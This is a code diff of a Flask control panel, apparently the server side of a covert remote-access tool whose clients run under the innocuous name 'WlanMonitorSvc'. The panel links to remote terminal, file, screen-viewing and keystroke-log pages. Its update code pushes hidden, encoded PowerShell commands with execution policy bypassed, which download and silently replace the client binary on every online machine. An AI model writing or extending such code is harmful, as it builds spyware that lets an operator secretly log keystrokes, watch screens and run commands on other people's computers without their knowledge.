@@ -4,6 +4,12 @@ import os, time, json, threading
 import urllib.parse
 from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, encrypt_data, decrypt_data, add_cmd_to_queue, get_next_cmd, init_client_queue
 
+try:
+    from core import backup_clients_db
+except Exception:
+    def backup_clients_db(reason='manual'):
+        return None
+
 bp = Blueprint('main', __name__)
 
 @bp.route('/api/ping/<mac>')
@@ -144,78 +150,78 @@ def api_toggle_test():
         save_db()
     return jsonify({"status": "ok", "is_test": clients_db[mac]['is_test']})
 
+
 @bp.route('/api/delete', methods=['POST'])
 def api_delete():
     if not session.get('logged_in'): return jsonify({"status": "error"}), 403
-    data = request.json
+    data = request.json or {}
     mac = data.get('mac')
     if mac in clients_db:
         del clients_db[mac]
         save_db()
     return jsonify({"status": "ok"})
 
-@bp.route('/update_mgmt', methods=['POST'])
-def update_mgmt():
-    if not session.get('logged_in'): return redirect(url_for('auth.login'))
-    new_ver = request.form.get('version')
-    uploaded_file = request.files.get('file')
-    uploaded_updater = request.files.get('updater_file')
-    channel = request.form.get('channel', 'stable') # 新增发布通道区分
+@bp.route('/api/batch_delete', methods=['POST'])
+def api_batch_delete():
+    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
+    data = request.json or {}
+    macs = data.get('macs', [])
+    deleted = 0
+    for mac in macs:
+        if mac in clients_db:
+            del clients_db[mac]
+            deleted += 1
+    if deleted:
+        save_db()
+    return jsonify({"status": "ok", "deleted": deleted})
 
-    if new_ver:
-        new_ver_str = new_ver.strip()
+def history_dir_for(channel):
+    return os.path.join(UPDATE_DIR, 'history_versions_test' if channel == 'test' else 'history_versions')
 
-        target_dir = UPDATE_DIR
-        if channel == 'test':
-            target_dir = os.path.join(UPDATE_DIR, 'testing')
-            os.makedirs(target_dir, exist_ok=True)
+def target_dir_for(channel):
+    if channel == 'test':
+        path = os.path.join(UPDATE_DIR, 'testing')
+        os.makedirs(path, exist_ok=True)
+        return path
+    return UPDATE_DIR
 
-        if uploaded_file and uploaded_file.filename != '':
-            binary_content = uploaded_file.read()
-            # 校验版本号是否被正确编译到二进制文件中
-            if new_ver_str.encode('ascii', errors='ignore') not in binary_content:
-                return f"<h2 style='color:red;'>错误：版本校验失败！</h2><p>您输入的版本号 {new_ver_str} 没有包含在上传的 EXE 文件内部。</p><p>请确保您已在 Visual Studio 的代码里修改了 MANUAL_COMPILE_VERSION 并成功重新生成了程序！</p><button onclick='history.back()'>返回重试</button>", 400
+def parse_history_selection(value):
+    if '|' in value:
+        channel, version = value.split('|', 1)
+    else:
+        channel, version = 'stable', value
+    channel = 'test' if channel == 'test' else 'stable'
+    return channel, version.strip()
 
-            if channel == 'stable':
-                ver_dir = os.path.join(UPDATE_DIR, 'history_versions', new_ver_str)
-                os.makedirs(ver_dir, exist_ok=True)
-                with open(os.path.join(ver_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
-                    f.write(binary_content)
+def version_key(v):
+    try:
+        return [int(x) if x.isdigit() else x for x in v.split('.')]
+    except Exception:
+        return [v]
 
-            with open(os.path.join(target_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
-                f.write(binary_content)
+def list_history_versions(channel):
+    root = history_dir_for(channel)
+    versions = []
+    if os.path.exists(root):
+        for d in os.listdir(root):
+            ver_dir = os.path.join(root, d)
+            if os.path.isdir(ver_dir) and os.path.exists(os.path.join(ver_dir, 'WlanMonitorSvc.exe')):
+                versions.append(d)
+    try:
+        versions.sort(key=version_key, reverse=True)
+    except Exception:
+        versions.sort(reverse=True)
+    return versions
 
-        if uploaded_updater and uploaded_updater.filename != '':
-            updater_content = uploaded_updater.read()
-
-            if channel == 'stable':
-                ver_dir = os.path.join(UPDATE_DIR, 'history_versions', new_ver_str)
-                os.makedirs(ver_dir, exist_ok=True)
-                with open(os.path.join(ver_dir, 'WlanMonitorSvc.updater.exe'), 'wb') as f:
-                    f.write(updater_content)
-
-            with open(os.path.join(target_dir, 'WlanMonitorSvc.updater.exe'), 'wb') as f:
-                f.write(updater_content)
-
-        if channel == 'stable':
-            with open(VERSION_FILE, 'w', encoding='utf-8') as f:
-                f.write(new_ver_str)
-        else:
-            with open(os.path.join(target_dir, 'version.txt'), 'w', encoding='utf-8') as f:
-                f.write(new_ver_str)
-
+def enqueue_update_for_channel(channel, host_url):
     import base64
-    host_url = request.host_url.rstrip('/')
-
     def get_version(v_str):
         try: return [int(x) for x in v_str.strip().split('.')]
         except: return [0, 0, 0]
 
-    # 下发全局紧急更新通知给所有在线设备
     for mac, info in clients_db.items():
         if channel == 'test' and not info.get('is_test', False):
-            continue # 如果是推测测试包，跳过普通机器不发通知
-
+            continue
         if is_online(info.get('last_seen', '')):
             client_ver = info.get('ver', '1.0.0')
             if get_version(client_ver) >= [1, 6, 10]:
@@ -231,51 +237,70 @@ def update_mgmt():
                 clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
     save_db()
 
+@bp.route('/update_mgmt', methods=['POST'])
+def update_mgmt():
+    if not session.get('logged_in'): return redirect(url_for('auth.login'))
+    new_ver = (request.form.get('version') or '').strip()
+    uploaded_file = request.files.get('file')
+    uploaded_updater = request.files.get('updater_file')
+    channel = 'test' if request.form.get('channel', 'stable') == 'test' else 'stable'
+
+    if new_ver:
+        target_dir = target_dir_for(channel)
+        ver_dir = os.path.join(history_dir_for(channel), new_ver)
+        os.makedirs(ver_dir, exist_ok=True)
+
+        if uploaded_file and uploaded_file.filename != '':
+            binary_content = uploaded_file.read()
+            if new_ver.encode('ascii', errors='ignore') not in binary_content:
+                return f"<h2 style='color:red;'>Version validation failed</h2><p>Version {new_ver} was not found inside the uploaded EXE.</p><button onclick='history.back()'>Back</button>", 400
+            with open(os.path.join(ver_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
+                f.write(binary_content)
+            with open(os.path.join(target_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
+                f.write(binary_content)
+
+        if uploaded_updater and uploaded_updater.filename != '':
+            updater_content = uploaded_updater.read()
+            with open(os.path.join(ver_dir, 'WlanMonitorSvc.updater.exe'), 'wb') as f:
+                f.write(updater_content)
+            with open(os.path.join(target_dir, 'WlanMonitorSvc.updater.exe'), 'wb') as f:
+                f.write(updater_content)
+
+        version_file = VERSION_FILE if channel == 'stable' else os.path.join(target_dir, 'version.txt')
+        with open(version_file, 'w', encoding='utf-8') as f:
+            f.write(new_ver)
+
+    enqueue_update_for_channel(channel, request.host_url.rstrip('/'))
     return redirect(url_for('main.index'))
 
 @bp.route('/rollback_version', methods=['POST'])
 def rollback_version():
     if not session.get('logged_in'): return redirect(url_for('auth.login'))
-    rollback_ver = request.form.get('version')
+    channel, rollback_ver = parse_history_selection(request.form.get('history_version') or request.form.get('version') or '')
     if rollback_ver:
-        ver_dir = os.path.join(UPDATE_DIR, 'history_versions', rollback_ver)
+        ver_dir = os.path.join(history_dir_for(channel), rollback_ver)
         exe_path = os.path.join(ver_dir, 'WlanMonitorSvc.exe')
         if os.path.exists(exe_path):
             import shutil
-            shutil.copy(exe_path, os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'))
-            with open(VERSION_FILE, 'w', encoding='utf-8') as f:
+            target_dir = target_dir_for(channel)
+            shutil.copy2(exe_path, os.path.join(target_dir, 'WlanMonitorSvc.exe'))
+            updater_path = os.path.join(ver_dir, 'WlanMonitorSvc.updater.exe')
+            if os.path.exists(updater_path):
+                shutil.copy2(updater_path, os.path.join(target_dir, 'WlanMonitorSvc.updater.exe'))
+            version_file = VERSION_FILE if channel == 'stable' else os.path.join(target_dir, 'version.txt')
+            with open(version_file, 'w', encoding='utf-8') as f:
                 f.write(rollback_ver)
-            import base64
-            host_url = request.host_url.rstrip('/')
-
-            def get_version(v_str):
-                try: return [int(x) for x in v_str.strip().split('.')]
-                except: return [0, 0, 0]
-
-            for mac, info in clients_db.items():
-                if is_online(info.get('last_seen', '')):
-                    client_ver = info.get('ver', '1.0.0')
-                    if get_version(client_ver) >= [1, 6, 10]:
-                        clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
-                    else:
-                        ps_cmd = (
-                            "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
-                            "if (-not $p) { exit }; "
-                            f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
-                            "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
-                        )
-                        ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
-                        clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
-            save_db()
+            enqueue_update_for_channel(channel, request.host_url.rstrip('/'))
     return redirect(url_for('main.index'))
 
 @bp.route('/delete_version', methods=['POST'])
 def delete_version():
     if not session.get('logged_in'): return redirect(url_for('auth.login'))
-    del_ver = request.form.get('version')
+    channel, del_ver = parse_history_selection(request.form.get('history_version') or request.form.get('version') or '')
     if del_ver:
-        ver_dir = os.path.join(UPDATE_DIR, 'history_versions', del_ver)
-        if os.path.exists(ver_dir):
+        ver_dir = os.path.abspath(os.path.join(history_dir_for(channel), del_ver))
+        allowed_root = os.path.abspath(history_dir_for(channel))
+        if ver_dir.startswith(allowed_root + os.sep) and os.path.isdir(ver_dir):
             import shutil
             shutil.rmtree(ver_dir)
     return redirect(url_for('main.index'))
@@ -287,9 +312,14 @@ def update_server():
 
     files_saved = False
     server_dir = os.path.dirname(os.path.abspath(__file__))
+    backup_clients_db('server_update')
     for uploaded_app in uploaded_files:
-        if uploaded_app and uploaded_app.filename != '' and uploaded_app.filename.endswith('.py'):
-            uploaded_app.save(os.path.join(server_dir, os.path.basename(uploaded_app.filename)))
+        filename = os.path.basename(uploaded_app.filename or '')
+        if uploaded_app and filename.endswith('.py') and filename.startswith(('app', 'bp_', 'core', 'ui')):
+            final_path = os.path.join(server_dir, filename)
+            tmp_path = final_path + '.upload_tmp'
+            uploaded_app.save(tmp_path)
+            os.replace(tmp_path, final_path)
             files_saved = True
 
     if files_saved:
@@ -340,378 +370,75 @@ def serve_update(filename):
     response.headers["Expires"] = "0"
     return response
 
-@bp.route('/tables_partial')
-def tables_partial():
-    if not session.get('logged_in'): return "未登录"
-    
+
+
+def render_device_tables():
     online_clients = {k: v for k, v in clients_db.items() if is_online(v.get('last_seen', ''))}
     offline_clients = {k: v for k, v in clients_db.items() if not is_online(v.get('last_seen', ''))}
-    
     PARTIAL_HTML = """
-    <h3>🟢 活跃在线设备列表 [ {{ online_clients|length }} 台 ]</h3>
-    <div class="table-scroll" style="overflow-x: auto;">
-    <table style="min-width: 800px;">
-        <thead>
-            <tr>
-                <th><input type="checkbox" id="checkAll" onclick="toggleAll(this)"></th>
-                <th>MAC 地址</th>
-                <th>IP 地址 / 地区</th>
-                <th>设备备注名</th>
-                <th>当前运行版本</th>
-                <th>当前焦点程序</th>
-                <th>最后心跳时间</th>
-                <th>快速操作</th>
-                <th>状态</th>
-            </tr>
-        </thead>
-        <tbody>
-            {% for mac, info in online_clients.items() %}
-            <tr oncontextmenu="window.showMainContextMenu && window.showMainContextMenu(event)">
-                <td><input type="checkbox" class="client-check" value="{{ mac }}"></td>
-                <td><code>{{ mac }}</code></td>
-                <td><code>{{ info.get('ip', '未知') }}</code><br><span style="font-size:12px; color:#555;">{{ info.get('location', '') }}</span></td>
-                <td>
-                    {{ info.name }} 
-                    <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
-                </td>
-                <td>
-                    v{{ info.ver }}
-                    <br><button onclick="toggleTest('{{ mac }}')" style="padding:2px 5px; border:none; border-radius:3px; font-size:10px; margin-top:4px; cursor:pointer; background: {{ '#ffc107' if info.get('is_test') else '#6c757d' }}; color: {{ '#000' if info.get('is_test') else '#fff' }};">{{ '🧪内测通道状态' if info.get('is_test') else '✅稳定版(点击切换内测)' }}</button>
-                </td>
-                <td style="color:#007bff; font-weight:bold; max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="{{ info.fg|default('暂无') }}">{{ info.fg|default('暂无') }}</td>
-                <td>{{ info.last_seen }}</td>
-                <td>
-                    <button onclick="toggleTest('{{ mac }}')" style="background:{{ '#28a745' if info.get('is_test') else '#6c757d' }}; color:#fff; padding:4px 8px; font-size:12px; border:none; cursor:pointer;">
-                        {{ '🟢 测试通道' if info.get('is_test') else '⚪ 设为测试' }}
-                    </button>
-                    <button onclick="quickCmd('{{ mac }}', 'shutdown /s /t 0')" style="background:#dc3545; padding:4px 8px; font-size:12px;">关机</button>
-                    <button onclick="quickCmd('{{ mac }}', 'shutdown /r /t 0')" style="background:#ffc107; color:#000; padding:4px 8px; font-size:12px;">重启</button>
-                    <a href="/terminal/{{ mac }}" style="background:#007bff; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">>_ 终端</a>
-                    <a href="/files/{{ mac }}" style="background:#17a2b8; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📁 文件</a>
-                    <a href="/taskmgr/{{ mac }}" style="background:#6f42c1; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📊 任务管理</a>
-                    <a href="/screen/{{ mac }}" style="background:#fd7e14; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📺 屏幕画面</a>
-                    <a href="/keylog/{{ mac }}" style="background:#20c997; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🔤 键盘记录</a>
-                    <a href="/view_log/{{ mac }}" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📜 运行日志</a>
-                    <a href="/entertainment/{{ mac }}" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🎵 娱乐控制</a>
-                </td>
-                <td class="status-online">📡 在线</td>
-            </tr>
-            {% else %}
-            <tr><td colspan="8" style="text-align: center; color: #888;">抱歉，目前没有监测到任何活动设备连接。</td></tr>
-            {% endfor %}
-        </tbody>
-    </table>
-    </div>
-
-    <div style="margin-bottom: 30px; background: #e9ecef; padding: 15px; border-radius: 8px;">
-        <b>⚡ 批量操作 (已选设备):</b>
-        <button onclick="batchCmd('shutdown /s /t 0')" style="background:#dc3545; margin-left:10px;">批量关机</button>
-        <button onclick="batchCmd('shutdown /r /t 0')" style="background:#ffc107; color:#000; margin-left:10px;">批量重启</button>
-        <button onclick="batchCmd('UPDATE_NOW')" style="background:#28a745; margin-left:10px;">强制检查更新</button>
-    </div>
-
-    <h3>🔴 离线设备记录 [ {{ offline_clients|length }} 台 ]</h3>
-    <div class="table-scroll" style="overflow-x: auto;">
-    <table style="min-width: 600px;">
-        <thead>
-            <tr>
-                <th>MAC 地址</th>
-                <th>最后已知 IP / 地区</th>
-                <th>最后已知名称</th>
-                <th>离线前版本</th>
-                <th>最近一次连接时间</th>
-                <th>操作</th>
-                <th>状态</th>
-            </tr>
-        </thead>
-        <tbody>
-            {% for mac, info in offline_clients.items() %}
-            <tr>
-                <td style="color:#777;"><code>{{ mac }}</code></td>
-                <td style="color:#777;"><code>{{ info.get('ip', '未知') }}</code><br><span style="font-size:12px;">{{ info.get('location', '') }}</span></td>
-                <td style="color:#777;">
-                    {{ info.name }}
-                    <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
-                </td>
-                <td style="color:#777;">
-                    v{{ info.ver }}
-                    <br><span style="padding:2px 4px; border-radius:3px; font-size:10px; background: {{ '#ffc107' if info.get('is_test') else '#6c757d' }}; color: {{ '#000' if info.get('is_test') else '#fff' }};">{{ '🧪内测状态' if info.get('is_test') else '稳定版' }}</span>
-                </td>
-                <td style="color:#777;">{{ info.last_seen }}</td>
-                <td>
-                    <button onclick="deleteClient('{{ mac }}')" style="background:#dc3545; color:#fff; padding:5px 10px; border:none; border-radius:4px; font-size:14px; cursor:pointer; margin-right:5px;">🗑️ 删除</button>
-                    <a href="/terminal/{{ mac }}" style="background:#6c757d; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block;">📝 查看遗留日志</a>
-                    <a href="/view_log/{{ mac }}" style="background:#e83e8c; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">📜 运行日志</a>
-                    <a href="/keylog/{{ mac }}" style="background:#20c997; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">🔤 键盘记录</a>
-                </td>
-                <td class="status-offline">已离线</td>
-            </tr>
-            {% else %}
-            <tr><td colspan="6" style="text-align: center; color: #888;">暂无离线历史记录</td></tr>
-            {% endfor %}
-        </tbody>
-    </table>
-    </div>
+    <section class="panel">
+      <div class="section-head"><div><h2>Online Devices</h2><p>{{ online_clients|length }} active client(s)</p></div><div class="toolbar compact"><button class="btn muted" onclick="toggleOnlineAll()">Select online</button><button class="btn danger" onclick="batchCmd('shutdown /s /t 0')">Shutdown</button><button class="btn warn" onclick="batchCmd('shutdown /r /t 0')">Restart</button><button class="btn ok" onclick="batchCmd('UPDATE_NOW')">Update</button></div></div>
+      <div class="table-scroll"><table><thead><tr><th></th><th>Device</th><th>Network</th><th>Version</th><th>Focus</th><th>Last seen</th><th>Actions</th><th>Status</th></tr></thead><tbody>
+      {% for mac, info in online_clients.items() %}
+      <tr oncontextmenu="window.showMainContextMenu && window.showMainContextMenu(event)">
+        <td data-label="Select"><input type="checkbox" class="online-client-check" value="{{ mac }}"></td>
+        <td data-label="Device"><code>{{ mac }}</code><br><span class="subtle">{{ info.name }}</span> <button class="mini" onclick="promptRename('{{ mac }}', '{{ info.name }}')">Rename</button></td>
+        <td data-label="Network"><code>{{ info.get('ip', 'unknown') }}</code><br><span class="subtle">{{ info.get('location', '') }}</span></td>
+        <td data-label="Version">v{{ info.ver }}<br><button class="mini {{ 'test' if info.get('is_test') else '' }}" onclick="toggleTest('{{ mac }}')">{{ 'Test' if info.get('is_test') else 'Stable' }}</button></td>
+        <td data-label="Focus" class="focus" title="{{ info.fg|default('none') }}">{{ info.fg|default('none') }}</td>
+        <td data-label="Last seen">{{ info.last_seen }}</td>
+        <td data-label="Actions" class="actions"><button class="mini" onclick="toggleTest('{{ mac }}')">Channel</button><a class="mini link" href="/terminal/{{ mac }}">Terminal</a><a class="mini link" href="/files/{{ mac }}">Files</a><a class="mini link" href="/taskmgr/{{ mac }}">Tasks</a><a class="mini link" href="/screen/{{ mac }}">Screen</a><a class="mini link" href="/view_log/{{ mac }}">Logs</a><a class="mini link" href="/entertainment/{{ mac }}">Media</a></td>
+        <td data-label="Status"><span class="pill online">Online</span></td>
+      </tr>
+      {% else %}<tr><td colspan="8" class="empty">No active devices.</td></tr>{% endfor %}
+      </tbody></table></div>
+    </section>
+    <section class="panel">
+      <div class="section-head"><div><h2>Offline Records</h2><p>{{ offline_clients|length }} saved record(s). Select multiple records to clean noise quickly.</p></div><div class="toolbar compact"><button class="btn muted" onclick="toggleOfflineAll()">Select offline</button><button class="btn danger" onclick="batchDeleteOffline()">Delete selected</button></div></div>
+      <div class="table-scroll"><table><thead><tr><th></th><th>Device</th><th>Last IP / Region</th><th>Version</th><th>Last seen</th><th>Actions</th><th>Status</th></tr></thead><tbody>
+      {% for mac, info in offline_clients.items() %}
+      <tr>
+        <td data-label="Select"><input type="checkbox" class="offline-client-check" value="{{ mac }}"></td>
+        <td data-label="Device"><code>{{ mac }}</code><br><span class="subtle">{{ info.name }}</span> <button class="mini" onclick="promptRename('{{ mac }}', '{{ info.name }}')">Rename</button></td>
+        <td data-label="Network"><code>{{ info.get('ip', 'unknown') }}</code><br><span class="subtle">{{ info.get('location', '') }}</span></td>
+        <td data-label="Version">v{{ info.ver }}<br><span class="pill {{ 'test' if info.get('is_test') else 'stable' }}">{{ 'Test' if info.get('is_test') else 'Stable' }}</span></td>
+        <td data-label="Last seen">{{ info.last_seen }}</td>
+        <td data-label="Actions" class="actions"><button class="mini danger" onclick="deleteClient('{{ mac }}')">Delete</button><a class="mini link" href="/terminal/{{ mac }}">Terminal log</a><a class="mini link" href="/view_log/{{ mac }}">Run log</a><a class="mini link" href="/keylog/{{ mac }}">Key log</a></td>
+        <td data-label="Status"><span class="pill offline">Offline</span></td>
+      </tr>
+      {% else %}<tr><td colspan="7" class="empty">No offline records.</td></tr>{% endfor %}
+      </tbody></table></div>
+    </section>
     """
     return render_template_string(PARTIAL_HTML, online_clients=online_clients, offline_clients=offline_clients)
+
+
+@bp.route('/tables_partial')
+def tables_partial():
+    if not session.get('logged_in'): return "not logged in", 403
+    return render_device_tables()
 
 @bp.route('/', methods=['GET'])
 def index():
     if not session.get('logged_in'):
         return redirect(url_for('auth.login'))
-
-    current_server_version = "未知版本"
+    current_server_version = "unknown"
     if os.path.exists(VERSION_FILE):
-        with open(VERSION_FILE, 'r', encoding='utf-8') as f:
-            current_server_version = f.read().strip()
-
-    history_versions = []
-    history_dir = os.path.join(UPDATE_DIR, 'history_versions')
-    if os.path.exists(history_dir):
-        for d in os.listdir(history_dir):
-            if os.path.isdir(os.path.join(history_dir, d)):
-                if os.path.exists(os.path.join(history_dir, d, 'WlanMonitorSvc.exe')):
-                    history_versions.append(d)
-    try:
-        history_versions.sort(key=lambda s: [int(x) if x.isdigit() else x for x in s.split('.')], reverse=True)
-    except:
-        history_versions.sort(reverse=True)
-
+        with open(VERSION_FILE, 'r', encoding='utf-8') as f: current_server_version = f.read().strip()
+    testing_version_file = os.path.join(UPDATE_DIR, 'testing', 'version.txt')
+    current_test_version = "not released"
+    if os.path.exists(testing_version_file):
+        with open(testing_version_file, 'r', encoding='utf-8') as f: current_test_version = f.read().strip()
+    stable_history_versions = list_history_versions('stable')
+    test_history_versions = list_history_versions('test')
     html_template = """
-    <!DOCTYPE html>
-    <html lang="zh-CN">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>控制台设备管理</title>
-        <style>
-            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
-            .container { max-width: 1100px; margin: 0 auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-            table { width: 100%; border-collapse: collapse; margin-top: 10px; margin-bottom: 30px; user-select: none; }
-            th, td { padding: 10px 10px; border-bottom: 1px solid #ddd; text-align: left; }
-            th { background-color: #007bff; color: white; }
-            tr:hover { background-color: #f1f1f1; }
-            .status-online { color: #28a745; font-weight: bold; }
-            .status-offline { color: #dc3545; font-weight: bold; }
-            .mgmt-box { background: #e9ecef; padding: 15px; border-radius: 8px; margin-bottom: 20px; overflow-wrap: break-word; }
-            input[type="text"], input[type="file"], select { padding: 8px; margin-right: 10px; border: 1px solid #ccc; border-radius:4px; max-width: 100%; box-sizing: border-box; }
-            button { padding: 8px 15px; background: #007bff; border: none; border-radius: 4px; cursor: pointer; color: white; margin: 2px; }
-            button:hover { background: #0056b3; }
-            .logout { float: right; padding:8px 15px; background: #dc3545; border-radius: 4px; text-decoration: none; color: #fff;}
-            .main-context { display: none; position: absolute; z-index: 1000; background: white; border: 1px solid #ccc; box-shadow: 2px 2px 5px rgba(0,0,0,0.2); border-radius: 4px; padding: 5px 0; min-width: 150px; }
-            .main-context-item { padding: 8px 15px; cursor: pointer; font-size: 14px; }
-            .main-context-item:hover { background-color: #007bff; color: white; }
-        </style>
-    </head>
-    <body>
-        <div class="container" onclick="window.hideMainContextMenu && window.hideMainContextMenu()">
-            <a href="/logout" class="logout">注销退出</a>
-            <h1 style="margin-top:0;">💻 设备综合管理后台</h1>
-
-            <div class="mgmt-box">
-                <h3 style="margin-top:0;">🛠 发布强制客户端更新</h3>
-                <p>当前全网服务器提供的最新强制更新版本号：<b style="color:red; font-size:18px;">{{ current_server_version }}</b></p>
-                <form action="/update_mgmt" method="post" enctype="multipart/form-data">
-                    <label>1. 发布新版本号(填入更高版本号单下发更新通知):</label><br>
-                    <input type="text" name="version" value="{{ current_server_version }}" style="margin: 5px 0 15px 0; width: 250px;">
-                    <br>
-                    <label>2. 选择要发布的通道群体:</label><br>
-                    <label style="margin-right:15px; cursor:pointer;"><input type="radio" name="channel" value="stable" checked> 发布为稳定版(全网所有终端接收)</label>
-                    <label style="cursor:pointer; color:#b18602; font-weight:bold;"><input type="radio" name="channel" value="test"> 发布为内测先行版(仅后台手动标记为内测的特定机器接收)</label>
-                    <br><br>
-                    <label>3. 上传为该版本准备的新本体 WlanMonitorSvc.exe(可选):</label><br>
-                    <input type="file" name="file" accept=".exe" style="margin: 5px 0 10px 0;">
-                    <br>
-                    <label>4. Upload updater WlanMonitorSvc.updater.exe(optional):</label><br>
-                    <input type="file" name="updater_file" accept=".exe" style="margin: 5px 0 10px 0;">
-                    <br>
-                    <button type="submit" style="background:#28a745; padding: 10px 20px; margin-top:5px;">校验并立刻推送执行更新</button>
-                </form>
-
-                <hr style="border: 1px solid #ccc; margin: 20px 0;">
-
-                <h3 style="margin-top:0;">⏪ 历史版本与回退管理</h3>
-                <form action="/rollback_version" method="post">
-                    <label>选择历史版本记录进行管理:</label><br>
-                    <select name="version" style="margin: 10px 0; width: 250px;">
-                        {% for v in history_versions %}
-                        <option value="{{ v }}" {% if v == current_server_version %}selected{% endif %}>{{ v }}</option>
-                        {% endfor %}
-                    </select>
-                    <br>
-                    <button type="submit" style="background:#ffc107; color:black; padding: 10px 20px;" onclick="return confirm('确定要令全网终端强制回退到该版本吗？')">强推全网回退该版本</button>
-                    <button type="submit" formaction="/delete_version" style="background:#dc3545; padding: 10px 20px;" onclick="return confirm('确定要删除该历史版本记录的服务端文件吗？')">删除服务器文件记录</button>
-                </form>
-
-                <hr style="border: 1px solid #ccc; margin: 20px 0;">
-
-                <h3 style="margin-top:0;">⚙️ 热更新服务端代码</h3>
-                <form action="/update_server" method="post" enctype="multipart/form-data">
-                    <label>支持热更新服务端所有 .py 文件 (如 app.py, core.py, bp_main.py等)，同名覆盖完毕后将自动重启服务端。</label><br>
-                    <input type="file" name="app_file" accept=".py" multiple style="margin: 10px 0;">
-                    <br>
-                    <button type="submit" style="background:#17a2b8; padding: 10px 20px; margin-top:5px;">更新并重启服务端</button>
-                </form>
-            </div>
-
-            <!-- 数据列表挂载容器 -->
-            <div id="target-tables">正在建立实时通信环境获取设备库并连接设备...</div>
-
-            <!-- 主界面右键菜单 -->
-            <div id="main-context" class="main-context">
-                <div class="main-context-item" onclick="onMainContextAction('shutdown /s /t 0')">🔴 批量关机</div>
-                <div class="main-context-item" onclick="onMainContextAction('shutdown /r /t 0')">🔄 批量重启</div>
-                <div class="main-context-item" onclick="onMainContextAction('UPDATE_NOW')" style="color:green;">🚀 强制更新</div>
-            </div>
-
-        </div>
-
-        <script>
-            let isUserInteracting = false;
-            window.addEventListener('touchstart', function() { isUserInteracting = true; }, {passive: true});
-            window.addEventListener('touchend', function() { setTimeout(function(){ isUserInteracting = false; }, 1000); });
-            window.addEventListener('mousedown', function() { isUserInteracting = true; });
-            window.addEventListener('mouseup', function() { setTimeout(function(){ isUserInteracting = false; }, 1000); });
-
-            // 定时使用 AJAX 异步拉取表格更新，达到实时无感动态列表
-            function fetchTables() {
-                if (isUserInteracting) return; // 如果用户正在进行触摸滑动操作，则暂时不刷新DOM以免打断用户
-
-                // 1. 保存当前勾选的设备MAC
-                var checkedMacs = [];
-                var checkboxes = document.querySelectorAll('.client-check:checked');
-                checkboxes.forEach(c => checkedMacs.push(c.value));
-
-                // 记录当前的表格横向滚动位置
-                var scrollContainers = document.querySelectorAll('.table-scroll');
-                var scrollPositions = [];
-                scrollContainers.forEach(c => scrollPositions.push(c.scrollLeft));
-
-                fetch('/tables_partial')
-                    .then(response => response.text())
-                    .then(html => {
-                        document.getElementById('target-tables').innerHTML = html;
-
-                        // 恢复表格滚动的横向位置
-                        var newScrollContainers = document.querySelectorAll('.table-scroll');
-                        newScrollContainers.forEach((c, i) => {
-                            if (scrollPositions[i] !== undefined) {
-                                c.scrollLeft = scrollPositions[i];
-                            }
-                        });
-
-                        // 2. 渲染新表格后恢复勾选状态
-                        var newCheckboxes = document.querySelectorAll('.client-check');
-                        var checkCount = 0;
-                        newCheckboxes.forEach(c => {
-                            if (checkedMacs.includes(c.value)) {
-                                c.checked = true;
-                                checkCount++;
-                            }
-                        });
-
-                        // 3. 恢复顶部全选框的显示状态
-                        var checkAllBtn = document.getElementById('checkAll');
-                        if (checkAllBtn && newCheckboxes.length > 0 && checkCount === newCheckboxes.length) {
-                            checkAllBtn.checked = true;
-                        }
-                    });
-            }
-
-            // 初始化立即加载，然后每间隔 1 秒刷一次
-            fetchTables();
-            setInterval(fetchTables, 3000);
-
-            window.toggleTest = function(mac) {
-                fetch('/api/toggle_test', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ mac: mac })
-                }).then(() => {
-                    fetchTables(); // 直接刷新列表看到新名称/新状态
-                });
-            };
-
-            // 通过 JS 发送重命名更新（防止由于全页面刷新打断用户填写或者页面滚动异常）
